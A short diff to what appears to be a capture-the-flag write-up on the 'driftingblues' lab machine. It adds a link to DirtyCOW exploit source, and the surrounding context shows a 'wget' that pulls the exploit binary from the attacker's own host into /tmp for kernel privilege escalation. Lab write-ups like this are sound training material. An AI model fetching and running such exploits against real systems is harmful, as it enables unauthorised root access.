@@ -157,6 +157,8 @@ Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 ```
 With our first couple of commands, we see something familiar, kernel 3.2, meaning it’s vulnerable to DirtyCOW, an exploit we rewrote in a previous post. We don’t even have to recompile it as it’s x86_64.
 
+It can be found here: [DirtyCoW](https://github.com/erroronsecurity/exploits/blob/main/dirtycow.c)
+
 ```
 cd /tmp
 wget http://me:8000/dirtycow
